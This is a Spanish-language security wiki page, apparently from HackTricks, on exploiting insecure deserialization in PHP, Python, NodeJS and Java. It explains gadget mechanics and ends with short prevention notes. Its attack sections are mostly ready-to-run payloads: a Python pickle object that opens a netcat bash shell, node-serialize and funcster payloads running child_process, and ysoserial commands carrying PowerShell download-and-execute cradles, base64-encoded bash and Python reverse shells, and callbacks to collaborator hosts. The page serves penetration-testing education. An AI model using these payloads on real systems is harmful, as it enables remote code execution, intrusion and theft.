# Deserializaci贸n

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


## Informaci贸n B谩sica

La **serializaci贸n** se entiende como el m茅todo de convertir un objeto en un formato que puede ser preservado, con la intenci贸n de almacenar el objeto o transmitirlo como parte de un proceso de comunicaci贸n. Esta t茅cnica se emplea com煤nmente para asegurar que el objeto pueda ser recreado en un momento posterior, manteniendo su estructura y estado.

La **deserializaci贸n**, por otro lado, es el proceso que contrarresta la serializaci贸n. Implica tomar datos que han sido estructurados en un formato espec铆fico y reconstruirlos de nuevo en un objeto.

La deserializaci贸n puede ser peligrosa porque potencialmente **permite a los atacantes manipular los datos serializados para ejecutar c贸digo da帽ino** o causar un comportamiento inesperado en la aplicaci贸n durante el proceso de reconstrucci贸n del objeto.


## PHP

En PHP, se utilizan m茅todos m谩gicos espec铆ficos durante los procesos de serializaci贸n y deserializaci贸n:

* `__sleep`: Invocado cuando un objeto est谩 siendo serializado. Este m茅todo debe devolver un array con los nombres de todas las propiedades del objeto que deben ser serializadas. Com煤nmente se utiliza para confirmar datos pendientes o realizar tareas de limpieza similares.
* `__wakeup`: Llamado cuando un objeto est谩 siendo deserializado. Se utiliza para restablecer cualquier conexi贸n a la base de datos que pueda haberse perdido durante la serializaci贸n y realizar otras tareas de reinitializaci贸n.
* `__unserialize`: Este m茅todo se llama en lugar de `__wakeup` (si existe) cuando un objeto est谩 siendo deserializado. Proporciona m谩s control sobre el proceso de deserializaci贸n en comparaci贸n con `__wakeup`.
* `__destruct`: Este m茅todo se llama cuando un objeto est谩 a punto de ser destruido o cuando el script finaliza. Se utiliza t铆picamente para tareas de limpieza, como cerrar manejadores de archivos o conexiones a bases de datos.
* `__toString`: Este m茅todo permite que un objeto sea tratado como una cadena. Puede utilizarse para leer un archivo u otras tareas basadas en las llamadas de funciones dentro de 茅l, proporcionando efectivamente una representaci贸n textual del objeto.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Si observas los resultados, puedes ver que las funciones **`__wakeup`** y **`__destruct`** se llaman cuando el objeto es deserializado. Ten en cuenta que en varios tutoriales encontrar谩s que la funci贸n **`__toString`** se llama al intentar imprimir alg煤n atributo, pero aparentemente eso **ya no sucede**.

{% hint style="warning" %}
El m茅todo **`__unserialize(array $data)`** se llama **en lugar de `__wakeup()`** si est谩 implementado en la clase. Te permite deserializar el objeto proporcionando los datos serializados como un array. Puedes usar este m茅todo para deserializar propiedades y realizar cualquier tarea necesaria durante la deserializaci贸n.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Puedes leer un **ejemplo de PHP explicado aqu铆**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), aqu铆 [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) o aqu铆 [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Podr铆as abusar de la funcionalidad de carga autom谩tica de PHP para cargar archivos PHP arbitrarios y m谩s:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializando Valores Referenciados

Si por alguna raz贸n deseas serializar un valor como una **referencia a otro valor serializado** puedes:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial para PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) puede ayudarte a generar payloads para abusar de las deserializaciones de PHP.\
Ten en cuenta que en varios casos **no podr谩s encontrar una forma de abusar de una deserializaci贸n en el c贸digo fuente** de la aplicaci贸n, pero podr铆as ser capaz de **abusar del c贸digo de extensiones externas de PHP.**\
Por lo tanto, si es posible, verifica la `phpinfo()` del servidor y **busca en internet** (incluso en los **gadgets** de **PHPGGC**) alg煤n posible gadget que puedas abusar.

### Deserializaci贸n de metadatos phar://

Si has encontrado una LFI que solo lee el archivo y no ejecuta el c贸digo PHP dentro de 茅l, por ejemplo utilizando funciones como _**file\_get\_contents(), fopen(), file() o file\_exists(), md5\_file(), filemtime() o filesize()**_. Puedes intentar abusar de una **deserializaci贸n** que ocurre al **leer** un **archivo** utilizando el protocolo **phar**.\
Para obtener m谩s informaci贸n, lee el siguiente post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Cuando el objeto se deserializa, se ejecutar谩 la funci贸n _\_\_reduce\_\__.\
Cuando se explota, el servidor podr铆a devolver un error.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Para obtener m谩s informaci贸n sobre c贸mo escapar de las **c谩rceles de pickle**, consulta:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **y** jsonpickle

La siguiente p谩gina presenta la t茅cnica para **abusar de una deserializaci贸n insegura en las bibliotecas de Python yamls** y finaliza con una herramienta que se puede utilizar para generar carga 煤til de deserializaci贸n RCE para **Pickle, PyYAML, jsonpickle y ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Contaminaci贸n de Clases (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Funciones M谩gicas de JS

JS **no tiene funciones "m谩gicas"** como PHP o Python que se ejecutar谩n solo para crear un objeto. Pero tiene algunas **funciones** que se **utilizan con frecuencia incluso sin llamarlas directamente** como **`toString`**, **`valueOf`**, **`toJSON`**.\
Si abusas de una deserializaci贸n, puedes **comprometer estas funciones para ejecutar otro c贸digo** (potencialmente abusando de contaminaciones de prototipos) y podr铆as ejecutar c贸digo arbitrario cuando se llamen.

Otra forma **"m谩gica" de llamar a una funci贸n** sin llamarla directamente es **comprometer un objeto que es devuelto por una funci贸n as铆ncrona** (promesa). Porque, si **transformas** ese **objeto devuelto** en otra **promesa** con una **propiedad** llamada **"then" de tipo funci贸n**, se **ejecutar谩** solo porque es devuelto por otra promesa. _Sigue_ [_**este enlace**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _para m谩s informaci贸n._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` y la contaminaci贸n de `prototype`

Si deseas aprender sobre esta t茅cnica, **echa un vistazo al siguiente tutorial**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Esta biblioteca permite serializar funciones. Ejemplo:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
El **objeto serializado** se ver谩 as铆:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Puedes ver en el ejemplo que cuando una funci贸n es serializada se a帽ade la bandera `_$$ND_FUNC$$_` al objeto serializado.

Dentro del archivo `node-serialize/lib/serialize.js` puedes encontrar la misma bandera y c贸mo el c贸digo la est谩 utilizando.

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

Como puedes ver en el 煤ltimo fragmento de c贸digo, **si se encuentra la bandera** se utiliza `eval` para deserializar la funci贸n, por lo que b谩sicamente **la entrada del usuario se est谩 utilizando dentro de la funci贸n `eval`**.

Sin embargo, **solo serializar** una funci贸n **no la ejecutar谩** ya que ser铆a necesario que alguna parte del c贸digo est茅 **llamando a `y.rce`** en nuestro ejemplo y eso es altamente **improbable**.\
De todos modos, podr铆as simplemente **modificar el objeto serializado** **a帽adiendo algunos par茅ntesis** para autoejecutar la funci贸n serializada cuando se deserialice el objeto.\
En el siguiente fragmento de c贸digo **nota el 煤ltimo par茅ntesis** y c贸mo la funci贸n `unserialize` ejecutar谩 autom谩ticamente el c贸digo:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Como se indic贸 anteriormente, esta biblioteca obtendr谩 el c贸digo despu茅s de `_$$ND_FUNC$$_` y lo **ejecutar谩** usando `eval`. Por lo tanto, para **auto-ejecutar c贸digo**, puedes **eliminar la parte de creaci贸n de la funci贸n** y el 煤ltimo par茅ntesis y **simplemente ejecutar un JS en una l铆nea** como en el siguiente ejemplo:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Puedes [**encontrar aqu铆**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **m谩s informaci贸n** sobre c贸mo explotar esta vulnerabilidad.

### [funcster](https://www.npmjs.com/package/funcster)

Un aspecto notable de **funcster** es la inaccesibilidad de los **objetos integrados est谩ndar**; quedan fuera del alcance accesible. Esta restricci贸n evita la ejecuci贸n de c贸digo que intenta invocar m茅todos en objetos integrados, lo que lleva a excepciones como `"ReferenceError: console is not defined"` cuando se utilizan comandos como `console.log()` o `require(something)`.

A pesar de esta limitaci贸n, la restauraci贸n del acceso completo al contexto global, incluidos todos los objetos integrados est谩ndar, es posible a trav茅s de un enfoque espec铆fico. Al aprovechar directamente el contexto global, se puede evitar esta restricci贸n. Por ejemplo, el acceso puede restablecerse utilizando el siguiente fragmento:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Para** [**m谩s informaci贸n lee esta fuente**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

El paquete **serialize-javascript** est谩 dise帽ado exclusivamente para fines de serializaci贸n, careciendo de capacidades de deserializaci贸n integradas. Los usuarios son responsables de implementar su propio m茅todo para la deserializaci贸n. Un uso directo de `eval` es sugerido por el ejemplo oficial para deserializar datos serializados:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Si esta funci贸n se utiliza para deserializar objetos, puedes **explotarla f谩cilmente**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Para** [**m谩s informaci贸n, lee esta fuente**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Biblioteca Cryo

En las siguientes p谩ginas puedes encontrar informaci贸n sobre c贸mo abusar de esta biblioteca para ejecutar comandos arbitrarios:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

En Java, **las devoluciones de llamada de deserializaci贸n se ejecutan durante el proceso de deserializaci贸n**. Esta ejecuci贸n puede ser explotada por atacantes que crean cargas maliciosas que activan estas devoluciones de llamada, lo que puede llevar a la ejecuci贸n potencial de acciones da帽inas.

### Huellas dactilares

#### Caja Blanca

Para identificar posibles vulnerabilidades de serializaci贸n en el c贸digo, busca:

* Clases que implementen la interfaz `Serializable`.
* Uso de las funciones `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Presta especial atenci贸n a:

* `XMLDecoder` utilizado con par谩metros definidos por usuarios externos.
* El m茅todo `fromXML` de `XStream`, especialmente si la versi贸n de XStream es menor o igual a 1.46, ya que es susceptible a problemas de serializaci贸n.
* `ObjectInputStream` junto con el m茅todo `readObject`.
* Implementaci贸n de m茅todos como `readObject`, `readObjectNodData`, `readResolve` o `readExternal`.
* `ObjectInputStream.readUnshared`.
* Uso general de `Serializable`.

#### Caja Negra

Para pruebas de caja negra, busca **firmas o "bytes m谩gicos"** espec铆ficos que denoten objetos serializados de Java (provenientes de `ObjectInputStream`):

* Patr贸n hexadecimal: `AC ED 00 05`.
* Patr贸n Base64: `rO0`.
* Cabeceras de respuesta HTTP con `Content-type` establecido en `application/x-java-serialized-object`.
* Patr贸n hexadecimal que indica compresi贸n previa: `1F 8B 08 00`.
* Patr贸n Base64 que indica compresi贸n previa: `H4sIA`.
* Archivos web con la extensi贸n `.faces` y el par谩metro `faces.ViewState`. Descubrir estos patrones en una aplicaci贸n web deber铆a provocar un examen detallado como se detalla en el [post sobre Deserializaci贸n de Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Verificar si es vulnerable

Si quieres **aprender c贸mo funciona una explotaci贸n de deserializaci贸n en Java**, deber铆as echar un vistazo a [**Deserializaci贸n B谩sica en Java**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserializaci贸n de DNS en Java**](java-dns-deserialization-and-gadgetprobe.md) y [**Carga 煤til de CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Prueba de Caja Blanca

Puedes verificar si hay instalada alguna aplicaci贸n con vulnerabilidades conocidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Puedes intentar **verificar todas las bibliotecas** conocidas por ser vulnerables y para las cuales [**Ysoserial**](https://github.com/frohoff/ysoserial) puede proporcionar un exploit. O puedes verificar las bibliotecas indicadas en [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Tambi茅n puedes usar [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) para buscar posibles cadenas de gadgets que puedan ser explotadas.\
Al ejecutar **gadgetinspector** (despu茅s de compilarlo), no te preocupes por las numerosas advertencias/errores que pueda mostrar y d茅jalo terminar. Escribir谩 todos los hallazgos en _gadgetinspector/gadget-results/gadget-chains-a帽o-mes-d铆a-hora-min.txt_. Ten en cuenta que **gadgetinspector no crear谩 un exploit y puede indicar falsos positivos**.

#### Prueba de Caja Negra

Usando la extensi贸n de Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) puedes identificar **qu茅 bibliotecas est谩n disponibles** (e incluso las versiones). Con esta informaci贸n podr铆a ser **m谩s f谩cil elegir un payload** para explotar la vulnerabilidad.\
[**Lee esto para aprender m谩s sobre GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe se enfoca en las deserializaciones de **`ObjectInputStream`**.

Usando la extensi贸n de Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) puedes **identificar bibliotecas vulnerables** explotables con ysoserial y **explotarlas**.\
[**Lee esto para aprender m谩s sobre Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner se enfoca en las deserializaciones de **`ObjectInputStream`**.

Tambi茅n puedes usar [**Freddy**](https://github.com/nccgroup/freddy) para **detectar vulnerabilidades de deserializaci贸n** en **Burp**. Este complemento detectar谩 vulnerabilidades no solo relacionadas con **`ObjectInputStream`** sino tambi茅n vulnerabilidades de deserializaci贸n de **Json** y **Yml**. En modo activo, intentar谩 confirmarlas utilizando payloads de sleep o DNS.\
[**Puedes encontrar m谩s informaci贸n sobre Freddy aqu铆.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Prueba de Serializaci贸n**

No todo se trata de verificar si el servidor est谩 utilizando alguna biblioteca vulnerable. A veces puedes **cambiar los datos dentro del objeto serializado y evadir algunas verificaciones** (quiz谩s otorgarte privilegios de administrador dentro de una aplicaci贸n web).\
Si encuentras un objeto serializado de Java que se env铆a a una aplicaci贸n web, **puedes usar** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **para imprimir en un formato m谩s legible para humanos el objeto de serializaci贸n que se env铆a**. Saber qu茅 datos est谩s enviando facilitar铆a modificarlos y evadir algunas verificaciones.

### **Explotaci贸n**

#### **ysoserial**

La herramienta principal para explotar deserializaciones de Java es [**ysoserial**](https://github.com/frohoff/ysoserial) ([**descarga aqu铆**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Tambi茅n puedes considerar usar [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) que te permitir谩 usar comandos complejos (con tuber铆as, por ejemplo).\
Ten en cuenta que esta herramienta est谩 **centrada** en explotar **`ObjectInputStream`**.\
Yo **comenzar铆a usando el payload "URLDNS"** antes que un payload de RCE para probar si la inyecci贸n es posible. De todos modos, ten en cuenta que tal vez el payload "URLDNS" no funcione pero otro payload de RCE s铆.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Al crear un payload para **java.lang.Runtime.exec()** **no puedes usar caracteres especiales** como ">" o "|" para redirigir la salida de una ejecuci贸n, "$()" para ejecutar comandos o incluso **pasar argumentos** a un comando separados por **espacios** (puedes hacer `echo -n "hello world"` pero no puedes hacer `python2 -c 'print "Hello world"'`). Para codificar correctamente el payload, puedes [utilizar esta p谩gina web](http://www.jackson-t.ca/runtime-exec-payloads.html).

Si茅ntete libre de usar el siguiente script para crear **todos los posibles payloads de ejecuci贸n de c贸digo** para Windows y Linux y luego probarlos en la p谩gina web vulnerable:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Puedes **utilizar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **junto con ysoserial para crear m谩s exploits**. M谩s informaci贸n sobre esta herramienta en las **diapositivas de la charla** donde se present贸 la herramienta: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) se puede utilizar para generar payloads para explotar diferentes bibliotecas de serializaci贸n **Json** y **Yml** en Java.\
Para compilar el proyecto necesit茅 **agregar** estas **dependencias** al archivo `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instala Maven** y **compila** el proyecto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lee m谩s sobre esta biblioteca de JSON de Java: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratorios

* Si deseas probar algunos payloads de ysoserial, puedes **ejecutar esta aplicaci贸n web**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Por qu茅

Java utiliza mucha serializaci贸n para varios prop贸sitos como:

- **Solicitudes HTTP**: La serializaci贸n se emplea ampliamente en la gesti贸n de par谩metros, ViewState, cookies, etc.
- **RMI (Invocaci贸n de M茅todo Remoto)**: El protocolo Java RMI, que depende completamente de la serializaci贸n, es fundamental para la comunicaci贸n remota en aplicaciones Java.
- **RMI sobre HTTP**: Este m茅todo es com煤nmente utilizado por aplicaciones web de cliente grueso basadas en Java, que utilizan la serializaci贸n para todas las comunicaciones de objetos.
- **JMX (Extensiones de Gesti贸n de Java)**: JMX utiliza la serializaci贸n para transmitir objetos a trav茅s de la red.
- **Protocolos Personalizados**: En Java, la pr谩ctica est谩ndar implica la transmisi贸n de objetos Java en bruto, lo cual se demostrar谩 en ejemplos de explotaci贸n pr贸ximos.

### Prevenci贸n

#### Objetos Transitorios

Una clase que implementa `Serializable` puede marcar como `transient` cualquier objeto dentro de la clase que no deba ser serializado. Por ejemplo:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Evitar la Serializaci贸n de una clase que necesita implementar Serializable

